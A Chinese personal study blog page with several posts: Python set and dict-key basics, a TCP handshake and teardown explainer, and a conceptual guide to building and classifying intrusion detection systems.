<p>要保证hash的正确性，作为key的对象就不能变。在Python中，字符串、整数等都是不可变的，因此，可以放心地作为key。而list是可变的，就不能作为key：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>key = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d[key] = <span class="string">'a list'</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: unhashable type: <span class="string">'list'</span></span><br></pre></td></tr></table></figure></p>
<p>set<br>set和dict类似，也是一组key的集合，但不存储value。由于key不能重复，所以，在set中，没有重复的key。</p>
<p>要创建一个set，需要提供一个list作为输入集合：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = set([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure></p>
<p>注意，传入的参数[1, 2, 3]是一个list，而显示的{1, 2, 3}只是告诉你这个set内部有1，2，3这3个元素，显示的顺序也不表示set是有序的。。</p>
<p>重复元素在set中自动被过滤：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = set([<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure></p>
<p>通过add(key)方法可以添加元素到set中，可以重复添加，但不会有效果：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.add(<span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.add(<span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br></pre></td></tr></table></figure></p>
<p>通过remove(key)方法可以删除元素：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.remove(<span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure></p>
<p>set可以看成数学意义上的无序和无重复元素的集合，因此，两个set可以做数学意义上的交集、并集等操作：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s1 = set([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s2 = set([<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s1 &amp; s2</span><br><span class="line">&#123;<span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s1 | s2</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br></pre></td></tr></table></figure></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/01/24/Python基础/" data-id="cjdjy3u2400000c74v7ez891p" class="article-share-link">Teilen</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-TCP协议" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/01/22/TCP协议/" class="article-date">
  <time datetime="2018-01-22T04:10:11.000Z" itemprop="datePublished">2018-01-22</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Study/">Study</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/01/22/TCP协议/">TCP协议的三次握手四次挥手</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>阅读<a href="http://blog.csdn.net/whuslei/article/details/6667471" target="_blank" rel="noopener">whuslei</a>的博客有感<br>简单来说个人理解的TCP就是：<br>三次握手：<br>Client端：“嘿，老哥，我想跟你说个事”<br>Server端：“行，我兜着，你说吧。”<br>Client端：“那我就说了啊。”<br>Client端向Server端吐槽省略一万字。。。。</p>
<p>四次挥手：<br>Client端：“哎呀，老哥，跟你讲话太开心了，但今天兄弟有点事，下次再聊可以吗。”<br>Server端：“行呀，随时欢迎呀，但是你后面有几条短讯还卡在路上，你先别关机行吗，等我接完。”<br>……过了一段时间，所有短讯都收到后……<br>Server端：“老哥，你说的话我都看完了啊，你可以去办事了，改天聊。”<br>Client端：“行，我下了啊，改天聊。”</p>
<p>三次是保证双方互相明确对方能收能发的最低值。<br>理论上讲不论握手多少次都不能确认一条信道是“可靠”的，但通过3次握手可以至少确认它是“可用”的，再往上加握手次数不过是提高“它是可用的”这个结论的可信程度。</p>
<p>以下是我阅读：<a href="http://blog.csdn.net/whuslei/article/details/6667471" target="_blank" rel="noopener">whuslei</a>的博客原文<br>建立TCP需要三次握手才能建立，而断开连接则需要四次握手。整个过程如下图所示：<br><img src="/2018/01/22/TCP协议/../TCP协议/1.gif" alt="TCP协议过程"></p>
<p>首先Client端发送连接请求报文，Server段接受连接后回复ACK报文，并为这次连接分配资源。Client端接收到ACK报文后也向Server段发生ACK报文，并分配资源，这样TCP连接就建立了。</p>
<p>那如何断开连接呢？简单的过程如下：<br><img src="/2018/01/22/TCP协议/../TCP协议/2.png" alt="如何断开连接"><br>【注意】中断连接端可以是Client端，也可以是Server端。</p>
<p>假设Client端发起中断连接请求，也就是发送FIN报文。Server端接到FIN报文后，意思是说”我Client端没有数据要发给你了”，但是如果你还有数据没有发送完成，则不必急着关闭Socket，可以继续发送数据。所以你先发送ACK，”告诉Client端，你的请求我收到了，但是我还没准备好，请继续你等我的消息”。这个时候Client端就进入FIN_WAIT状态，继续等待Server端的FIN报文。当Server端确定数据已发送完成，则向Client端发送FIN报文，”告诉Client端，好了，我这边数据发完了，准备好关闭连接了”。Client端收到FIN报文后，”就知道可以关闭连接了，但是他还是不相信网络，怕Server端不知道要关闭，所以发送ACK后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。“，Server端收到ACK后，”就知道可以断开连接了”。Client端等待了2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，我Client端也可以关闭连接了。Ok，TCP连接就这样关闭了！</p>
<p>整个过程Client端所经历的状态如下：<br><img src="/2018/01/22/TCP协议/../TCP协议/3.gif" alt="Client端所经历"></p>
<p>而Server端所经历的过程如下：<br><img src="/2018/01/22/TCP协议/../TCP协议/4.gif" alt="Server端所经历"></p>
<p>【注意】 在TIME_WAIT状态中，如果TCP client端最后一次发送的ACK丢失了，它将重新发送。TIME_WAIT状态中所需要的时间是依赖于实现方法的。典型的值为30秒、1分钟和2分钟。等待之后连接正式关闭，并且所有的资源(包括端口号)都被释放。</p>
<p>【问题1】为什么连接的时候是三次握手，关闭的时候却是四次握手？<br>答：因为当Server端收到Client端的SYN连接请求报文后，可以直接发送SYN+ACK报文。其中ACK报文是用来应答的，SYN报文是用来同步的。但是关闭连接时，当Server端收到FIN报文时，很可能并不会立即关闭SOCKET，所以只能先回复一个ACK报文，告诉Client端，”你发的FIN报文我收到了”。只有等到我Server端所有的报文都发送完了，我才能发送FIN报文，因此不能一起发送。故需要四步握手。</p>
<p>【问题2】为什么TIME_WAIT状态需要经过2MSL(最大报文段生存时间)才能返回到CLOSE状态？</p>
<p>答：虽然按道理，四个报文都发送完毕，我们可以直接进入CLOSE状态了，但是我们必须假象网络是不可靠的，有可以最后一个ACK丢失。所以TIME_WAIT状态就是用来重发可能丢失的ACK报文。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/01/22/TCP协议/" data-id="cjdjy3u5n000s0c74kbgx6ewa" class="article-share-link">Teilen</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CS/">CS</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-入侵检测系统搭建" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/01/16/入侵检测系统搭建/" class="article-date">
  <time datetime="2018-01-16T10:43:27.000Z" itemprop="datePublished">2018-01-16</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/毕设/">毕设</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/01/16/入侵检测系统搭建/">入侵检测系统搭建</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>　　通常来说，一个企业或机构准备进军此领域时，往往选择从基于网络的IDS入手，因为网上有很多这方面的开放源代码和资料，实现起来比较容易，并且，基于网络的IDS适应能力强。有了简单网络IDS的开发经验，再向基于主机的IDS、分布式IDS、智能IDS等方面迈进的难度就小了很多。在此，笔者将以基于网络的IDS为例，介绍典型的IDS开发思路。<br>　　根据CIDF规范，我们从功能上将入侵检测系统划分为四个基本部分：数据采集子系统、数据分析子系统、控制台子系统、数据库管理子系统，如附图所示。<br>　　具体实现起来，一般都将数据采集子系统（又称探测器）和数据分析子系统在Linux或Unix平台上实现，我们称之为数据采集分析中心;将控制台子系统在Windows NT或2000上实现，数据库管理子系统基于Access或其他功能更强大的数据库，多跟控制台子系统结合在一起，我们称之为控制管理中心。本文以Linux和Windows NT平台为例介绍数据采集分析中心和控制管理中心的实现。<br>　　可以按照如下步骤构建一个基本的入侵检测系统。</p>
<h3 id="第一步-获取libpcap和tcpdump"><a href="#第一步-获取libpcap和tcpdump" class="headerlink" title="第一步 获取libpcap和tcpdump"></a>第一步 获取libpcap和tcpdump</h3><p>　　审计踪迹是IDS的数据来源，而数据采集机制是实现IDS的基础，否则，巧妇难为无米之炊，入侵检测就无从谈起。数据采集子系统位于IDS的最底层，其主要目的是从网络环境中获取事件，并向其他部分提供事件。目前比较流行的做法是：使用libpcap和tcpdump，将网卡置于“混杂”模式，捕获某个网段上所有的数据流。<br>　　libpcap是Unix或Linux从内核捕获网络数据包的必备工具，它是独立于系统的API接口，为底层网络监控提供了一个可移植的框架，可用于网络统计收集、安全监控、网络调试等应用。<br>　　tcpdump是用于网络监控的工具，可能是Unix上最著名的sniffer了，它的实现基于libpcap接口，通过应用布尔表达式打印数据包首部，具体执行过滤转换、包获取和包显示等功能。tcpdump可以帮助我们描述系统的正常行为，并最终识别出那些不正常的行为，当然，它只是有益于收集关于某网段上的数据流（网络流类型、连接等）信息，至于分析网络活动是否正常，那是程序员和管理员所要做的工作。<br>　　libpcap和tcpdump在网上广为流传，开发者可以到相关网站下载。</p>
<h3 id="第二步-构建并配置探测器，实现数据采集功能"><a href="#第二步-构建并配置探测器，实现数据采集功能" class="headerlink" title="第二步 构建并配置探测器，实现数据采集功能"></a>第二步 构建并配置探测器，实现数据采集功能</h3><p>　　1. 应根据自己网络的具体情况，选用合适的软件及硬件设备，如果你的网络数据流量很小，用一般的PC机安装Linux即可，如果所监控的网络流量非常大，则需要用一台性能较高的机器。<br>　　2. 在Linux服务器上开出一个日志分区，用于采集数据的存储。<br>　　3. 创建libpcap库。从网上下载的通常都是libpcap.tar.z的压缩包，所以，应先将其解压缩、解包，然后执行配置脚本，创建适合于自己系统环境的Makefile，再用make命令创建libpcap库。libpcap安装完毕之后，将生成一个libpcap库、三个include文件和一个man页面（即用户手册）。<br>　　4. 创建tcpdump。与创建libpcap的过程一样，先将压缩包解压缩、解包到与libpcap相同的父目录下，然后配置、安装tcpdump。<br>　　如果配置、创建、安装等操作一切正常的话，到这里，系统已经能够收集到网络数据流了。至于如何使用libpcap和tcpdump，还需要参考相关的用户手册。</p>
<h3 id="第三步-建立数据分析模块"><a href="#第三步-建立数据分析模块" class="headerlink" title="第三步 建立数据分析模块"></a>第三步 建立数据分析模块</h3><p>　　网上有一些开放源代码的数据分析软件包，这给我们构建数据分析模块提供了一定的便利条件，但这些“免费的午餐”一般都有很大的局限性，要开发一个真正功能强大、实用的IDS，通常都需要开发者自己动手动脑设计数据分析模块，而这往往也是整个IDS的工作重点。<br>　　数据分析模块相当于IDS的大脑，它必须具备高度的“智慧”和“判断能力”。所以，在设计此模块之前，开发者需要对各种网络协议、系统漏洞、攻击手法、可疑行为等有一个很清晰、深入的研究，然后制订相应的安全规则库和安全策略，再分别建立滥用检测模型和异常检测模型，让机器模拟自己的分析过程，识别确知特征的攻击和异常行为，最后将分析结果形成报警消息，发送给控制管理中心。<br>　　设计数据分析模块的工作量浩大，并且，考虑到“道高一尺，魔高一丈”的黑客手法日益翻新，所以，这注定是一个没有终点的过程，需要不断地更新、升级、完善。在这里需要特别注意三个问题：<br>　　① 应优化检测模型和算法的设计，确保系统的执行效率；<br>　　② 安全规则的制订要充分考虑包容性和可扩展性，以提高系统的伸缩性；<br>　　③ 报警消息要遵循特定的标准格式，增强其共享与互操作能力，切忌随意制订消息格式的不规范做法。</p>
<h3 id="第四步-构建控制台子系统"><a href="#第四步-构建控制台子系统" class="headerlink" title="第四步 构建控制台子系统"></a>第四步 构建控制台子系统</h3><p>　　控制台子系统负责向网络管理员汇报各种网络违规行为，并由管理员对一些恶意行为采取行动（如阻断、跟踪等）。由于Linux或Unix平台在支持界面操作方面远不如常用的Windows产品流行，所以，为了把IDS做成一个通用、易用的系统，笔者建议将控制台子系统在Windows系列平台上实现。<br>　　控制台子系统的主要任务有两个：<br>　　① 管理数据采集分析中心，以友好、便于查询的方式显示数据采集分析中心发送过来的警报消息；<br>　　② 根据安全策略进行一系列的响应动作，以阻止非法行为，确保网络的安全。<br>　　控制台子系统的设计重点是：警报信息查询、探测器管理、规则管理及用户管理。<br>　　1．警报信息查询：网络管理员可以使用单一条件或复合条件进行查询，当警报信息数量庞大、来源广泛的时候，系统需要对警报信息按照危险等级进行分类，从而突出显示网络管理员需要的最重要信息。<br>　　2．探测器管理：控制台可以一次管理多个探测器（包括启动、停止、配置、查看运行状态等），查询各个网段的安全状况，针对不同情况制订相应的安全规则。<br>　　3．规则库管理功能：为用户提供一个根据不同网段具体情况灵活配置安全策略的工具，如一次定制可应用于多个探测器、默认安全规则等。<br>　　4．用户管理：对用户权限进行严格的定义，提供口令修改、添加用户、删除用户、用户权限配置等功能，有效保护系统使用的安全性。</p>
<h3 id="第五步-构建数据库管理子系统"><a href="#第五步-构建数据库管理子系统" class="headerlink" title="第五步 构建数据库管理子系统"></a>第五步 构建数据库管理子系统</h3><p>　　一个好的入侵检测系统不仅仅应当为管理员提供实时、丰富的警报信息，还应详细地记录现场数据，以便于日后需要取证时重建某些网络事件。<br>　　数据库管理子系统的前端程序通常与控制台子系统集成在一起，用Access或其他数据库存储警报信息和其他数据。该模块的数据来源有两个：<br>　　① 数据分析子系统发来的报警信息及其他重要信息；<br>　　② 管理员经过条件查询后对查询结果处理所得的数据，如生成的本地文件、格式报表等。<br>　　第六步 联调，一个基本的IDS搭建完毕<br>　　以上几步完成之后，一个IDS的最基本框架已被实现。但要使这个IDS顺利地运转起来，还需要保持各个部分之间安全、顺畅地通信和交互，这就是联调工作所要解决的问题。<br>　　首先，要实现数据采集分析中心和控制管理中心之间的通信，二者之间是双向的通信。控制管理中心显示、整理数据采集分析中心发送过来的分析结果及其他信息，数据采集分析中心接收控制管理中心发来的配置、管理等命令。注意确保这二者之间通信的安全性，最好对通信数据流进行加密操作，以防止被窃听或篡改。同时，控制管理中心的控制台子系统和数据库子系统之间也有大量的交互操作，如警报信息查询、网络事件重建等。<br>　　联调通过之后，一个基本的IDS就搭建完毕。后面要做的就是不断完善各部分功能，尤其是提高系统的检测能力。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/01/16/入侵检测系统搭建/" data-id="cjdjy3u5o000t0c74kczi4xmw" class="article-share-link">Teilen</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/入侵检测/">入侵检测</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-入侵检测" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/01/16/入侵检测/" class="article-date">
  <time datetime="2018-01-16T10:11:25.000Z" itemprop="datePublished">2018-01-16</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/毕设/">毕设</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/01/16/入侵检测/">入侵检测</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>什么是入侵检测<br>   入侵检测(Intrusion Detection )是对入侵行为的检测。它通过收集和分析计算机网络或计算机系统中若于关键点的信息，检查网络或系统中是否存在违反安全策略的行为和被攻击的迹象。入侵检测作为一种积极主动的安全防护技术，提供了对内部攻击、外部攻击和误操作的实时保护，在网络系统受到危害之前拦截和响应入侵入侵检测技术虽然也能够对网络攻击进行识另拼作出反应，但其侧重点还是在于发现，而不能代替防火墙系统执行整个网络的访问控制策略。<br>     入侵检测系统（intrusion Detection System ,IDS）是对计算机和网络资源的恶意使用为进行识别的系统；它的目的是监测和发现可能存在的攻击行为，包括来自系统外部的入侵行为和来自内部用户的非授权行为，并且采取相应的防护手段。</p>
<p>入侵检测系统的分类</p>
<p>一：按检测分析方法分类</p>
<p>1：异常检测<br>   基于异常的入侵检测方法主要来源于这样的思想，任何人的正常行为都是有一定的规律的，并且可以通过分析这些行为的日志信息型总结出这些规律，而入侵和滥用行为规则通常和正常的行为存在严重的差异，通过检查这些差异就可以判断是否为入侵。总之，一场检测基于这样的假设和前提：用户活动是有规律的，而且这种规律是可以通过数据有效的描述和反映；入侵时异常活动的子集和用户的正常活动有着可以描述的明显的区别。<br>   异常监测系统首先经过一个学习阶段，总结正常的行为的轮廓成为自己的先验知识，系统运行时将信息采集子系统获得并预处理后的数据与正常行为模式比较，如果差异不超出预设阀值，则认为是正常的，出现较大差异即超过阀值则判定为入侵。<br>   <img src="/2018/01/16/入侵检测/../入侵检测/ruqinjiance1.png" alt="异常检测"></p>
<p>   异常检测系统有如下特点：<br>      1)：检测的效率取决于用户轮过的完备性和监控的频率，因为不需要对每种入侵行为进行定义，而能有效检测未知的入侵，因此也称为一个研究热点<br>      2)：系统能针对用户行为的改变进行自我调整和优化，但随着检测模型的逐步精确，异常检测会消耗更多的系统资源</p>
<p>2：误用检测<br>   又称为基于特征的检测，基于误用的入侵检测系统通过使用某种模式或者信号标示表示攻击，进而发现同类型的攻击，其实现过程是：先收集非正常操作的行为特征，系统就认为这种行为是入侵，系统处理过程如同：<br>   <img src="/2018/01/16/入侵检测/../入侵检测/ruqinjiance2.png" alt="误用检测"></p>
<p>这里写图片描述<br>   这种方法可以检测到许多甚至是全部已知的攻击行为，如果入侵特征与正常的用户行为能匹配，则系统会发生误报，如果没有特征能与某种新的攻击行为匹配，则系统会发生漏报。<br>   特点：采用特征匹配模式能明显降低错报率，但漏报率随之增加，攻击特征的细微变化，会使得滥用检测无能为力。</p>
<p>二：按数据源分为</p>
<p>1：基于主机的入侵检测<br>   基于主机的入侵检测是入侵检测的最初期形式，这种入侵检测系统通常运行在被检测的主机或者服务器上，实时检测检测系统的运行，通常从主机的审计记录和日志文件中获得所需的主要数据源，并辅之以主机上的其他信息，在此基础上完成检测攻击行为的任务。特别的，从主机入侵检测技术中还可以单独分离出基于应用的入侵检测模型，这是特别针对于某个特定任务的应用程序而设计的入侵检测技术，采用的输入数据源是应用程序的日志信息。<br>   基于主机的入侵检测悉尼型来源主要包括：<br>      1）：系统信息，几乎所有的操作系统都提供一组命令，获得本机当前激活的进程的状态信息，他们直接检查内核程序的内存信息。<br>      2）：记账，通常指由操作系统或操作员所执行的特定操作，记录计算机资源的使用情况，例如CPU占用时间，内存，硬盘，网络使用情况。在计算机未普及之前，记账是为了向用户收费的。<br>       3）：系统日志，可分为操作系统日志和应用程序日志两部分。操作系统日志从不同方面记录了系统中发生的事情，对于入侵检测而言，具备重要的价值，当一个进程终止时，系统内核为每个进程在进程日志文件中写入一条记录。<br>       4）：C2安全审计，记录所有可能与安全性有关的发生在系统上的事情。</p>
<p>   基于主机的入侵检测能够较为准确的检测到发生在主机系统高层的复杂攻击行为，其中，许多发生在应用进程级别的攻击行为是无法依靠基于网络的入侵检测来完成的，基于主机的入侵检测系统巨头检测效率高，分析代价小，分析速度快的特点，能够迅速并准确的定为入侵者，并可以结合操作系统和应用程序的行为特征对入侵进行进一步的分析，响应。比如，一旦检测到有入侵行为，我们可以立即使该用户的账号失效，用户的进程中断。他可以帮助发现基于网络的入侵检测无法检测的加密攻击。基于主机的入侵检测系统尤其对于独立的服务器及应用构造简单，易于理解，也只有这种检测方式能检测出通过控制台的入侵活动。目前许多是基于主机日志分析的。</p>
<p>   同时，基于主机的入侵检测系统也有若干显而易见的缺点，由于他一定程度上依赖于特定的操作系统平台，管理困难，必须按照每一台机器的环境配置管理。同时主机的日志提供的信息有限，有的入侵手段和途径不会在日志中有所反映，日志系统对网络层的入侵行为无能为力。在数据提取的实时性，充分性，可靠性方面基于主机日志的入侵检测系统不如基于网络的入侵检测系统。他通常无法对网络环境下发生的大量攻击行为作出及时的反应，他在所保护主机上运行，这也会影响宿主机的运行性能。</p>
<p>2：基于网络的入侵检测系统<br>   通过监听网络中的数据包，既抓包技术来获取必要的数据来源，并通过协议分析，特征匹配，统计分析等手段当前发生的攻击行为。<br>   基于网络的入侵检测的优点是：一个安装在网络合适位置NIDS系统可以监视一个很大范围的网络，他的运行丝毫不影响主机或者服务器的运行效率，因为基于网络的入侵检测系统通常采取独立主机和被动监听的工作模式，他对网络的性能影响也很小。NIDS能够实时监控网络中的数据流量，并发现潜在的攻击行为和作为迅速的响应，而使攻击者难以发现自己已被监视，另外，他的分析对象是网络协议，一般没有移植性的问题。<br>   同事基于网络的入侵检测系统的主要问题是监视数据量过于庞大并且他不结合操作系统特征来对网络行为进行准确的判断，在网络通讯的高峰时刻，难以检查所有数据包；如果网络数据被加密，NIDS就不能扫描协议或内容NIDS不能判断一个攻击是否已经成功，对于渐进式，合作式的攻击难以防范。</p>
<p>常用的入侵检测技术</p>
<p>1：基于统计分析技术的入侵检测<br>   他试图建立一个对应”正常活动”的特征原型，然后把与所建立的特征原型中差别”很大”的所有行为都标志为异常。显而易见，当入侵集合与异常活动集合不完全相等时，一定会存在漏 报或者误报的问题，为了使漏报和误报的概率较为符合实际需要，必须选择一个区分异常事件的阀值，而调整和更新某些系统特征度量值的方法非常复杂，开销巨大，在实际情况下，试图用逻辑方法明确划分正常行为和异常行为两个集合非常困难，统计手段的主要优点是可以自适应学习用户的行为，主要问题是其可能被入侵者逐渐训练以致最终将入侵事件误认为是正常，并且阀值设置不会当导致大比例的误报与漏报，此外，由于统计量度对事件顺序的不敏感性，事件间的关系会漏掉。</p>
<p>2：基于模式预测异常检测<br>   基于模式预测异常检测方法的假设条件是：事件序列不是随机的，而是遵循可辨别的模式，这种检测方法的特点是考虑了事件的序列和相互关系。而基于时间的推理方法则利用时间规则识别用户行为正常模式的特征，通过归纳学习产生这些规则集，能动态的修改系统中的规则，使之具有高的预测性，准确性和可信度。如果规则大部分时间是正确的，并能够成功的运用预测所观察到的数据，那么规则就具有高的可信度，根据观察到用户的行为，归纳产生出一套规则集来构建用户的轮廓框架，如果观测到的事件序列匹配规则的左边，而后续事件显著的背离根据规则预测到的事件，那么系统就可以检测出这种偏离，这就表明用户操作是异常。如果能预测出不着呢刚才的后继事件的片段，则一定程度上断定用户行为的异常性，这种方法的主要优点是：<br>       1）：能较好地处理变化多样的用户行为，具有很强的时序模式。<br>       2）：能够集中考察少数几个相关的安全事件，而不是关注可疑的整个登录会话过程<br>       3）：对发现检测系统遭受攻击，具有良好的灵敏度，因为根据规则的蕴含语义，在系统学习阶段，能够更容易的辨别出欺骗者训练系统的企图<br>       预测模式生成技术的问题在于未被这些规则描述的入侵会被漏检</p>
<p>3：基于神经网络技术的入侵检测<br>   神经网络用给定的n个动作训练神经网络去预测用户的下一步行为。训练结束之后，神经网络使用已出现在网中的用户特征匹配实际的用户行为，标志统计差异较大的事件为异常或者非法。使用神经网络的优点是可以很好的处理噪声数据，因为他只与用户行为相关，而不依赖于任何底层数据特性的统计，但同样有入侵者能够在其徐诶阶段训练网络的问题。</p>
<p>4：基于机器学习异常检测<br>   这种异常检测方法通过机器学习实现入侵检测，其主要的方法有死记硬背式、监督、学习、归纳学习、类比学习等。</p>
<p>5：基于数据挖掘异常检测<br>   数据挖掘，也称知识发现，通常记录系统运行日志得数据库都非常大，如何从大量数据中“浓缩”出一个值或者一组值来表示对象得概貌，并以此进行行为的异常分析和检测，这就是数据挖掘技术在入侵检测系统的应用，数据挖掘中一般会用到数据聚类技术。</p>
<p>6：专家系统<br>   用专家系统对入侵进行检测，经常时针对具有明显特征的入侵行为，即所谓的规则，即时知识，专家系统的建立依赖于知识库的完备性，知识库的完备性又取决于审计记录的完备性和实时性。<br>       基于专家系统无用入侵检测方法是通过将安全专家的知识表示城IF-THEN规则形成专家知识库，然后，运用推理算法进行入侵检测，编码规则说明攻击的必需条件作为IF的组成部分，当规则的左边的全部条件都满足时，规则的右边的动作才会执行，入侵检测专家系统应用的实际问题时要处理大量的数据和依赖于审计跟踪的次序，其推理方式主要又以下两种：<br>       1)：根据给定的数据，应用符号推理出入侵的发生情况，需要解决的主要问题时处理序列数据和知识库的维护，不足之处就是只能检测已知。<br>       2)：根绝其他的入侵证据，进行不确定性推理，这种推理的局限性就是推理证据的不精确和专家知识的不精确。</p>
<p>入侵检测的技术关键<br>   入侵检测技术对于网络安全方面来说是一项重要的技术而提高入侵检查的一项根本方法就是提高模式匹配效率，提高模式匹配的效率也就是等于提升了网络安全。</p>
<p>一：模式匹配技术</p>
<p>1：模式匹配<br>   入侵检测系统对重要的网段进行监控，对网段中没个数据包进行模式匹配和分析。如果数据包内容和入侵检测系统规律相符，就会发出警报，并切断网络，由此可见模式匹配是影响入侵检测的关键技术。<br>       模式匹配定义为：设有给定的连哥哥串T和P，则在T中寻找P的子串的经过成为模式匹配。T称为正文，P称为模式，通常T的长度远远大于P的长度，若在T中找到等于P的子串，则匹配成功，否则匹配失败。</p>
<p>2：模式匹配的原理<br>   在入侵检测中，模式匹配可以理解为：给定入侵规则库中的一个特定的模式字符串P，在网络数据包T中进行查找，确定P是否在T中出现。</p>
<p>3：模式匹配的规则<br>   网络入侵检测以网络中采集的数据包为数据源，使用模式匹配方法对数据包进行检测从而发现网络中可能存在的入侵事件，其中对数据包的检测就是要在网络数据包中检测是否存在可以代表入侵行为或者入侵企图的一些字符串，即查找出某些入侵规则中规则选项中所标识的字符串，由于规则数较多，模式匹配过程是入侵检测系统中时间小号最大的环节之一。如果没有高效的模式匹配算法作为保障，检测过程中就会产生超时溢出错误，此时为了保证正常工作状态，系统将主动的丢弃一些数据包，形成漏检。<br>       所以，一个好的高效的模式皮匹配算法对入侵检测效率的提升至关重要。</p>
<p>二：模式匹配算法</p>
<p>参考：<a href="http://dsqiu.iteye.com/blog/1700312" target="_blank" rel="noopener">http://dsqiu.iteye.com/blog/1700312</a></p>
<p>案例说明</p>
<p>1：介绍<br>   以企业入侵日志为例，假设攻击者要攻击某个企业，那么必需使用进入到该企业的网络，已知该企业的网络分为内部用户和访客，每次登陆都会产生一系列的日志，那么如何根据这些wlan的访问日志来进行登陆用户的异常行为检测呢？</p>
<p>2：分析<br>   根据访问日志，我们并不能确定使用网络的用户哪个是进行入侵的，即我们没有一个明确的结果来判断入侵者和非入侵者，那么这里我们可以采用的入侵检测技术便可以是：基于统计的入侵检测技术</p>
<p>3：实现<br>   首先我们可以对访问者进行比例划分，例如9：1，利用90%的数据进行构建用户肖像，统计分析出用户肖像数据，继而利用10%的数据进行数据测试，主要依据的便是90%数据构建的用户模型。统计处测试用户产生的异常值。并可以根据实际情况设置一个阀值，来判定是否是入侵用户。</p>
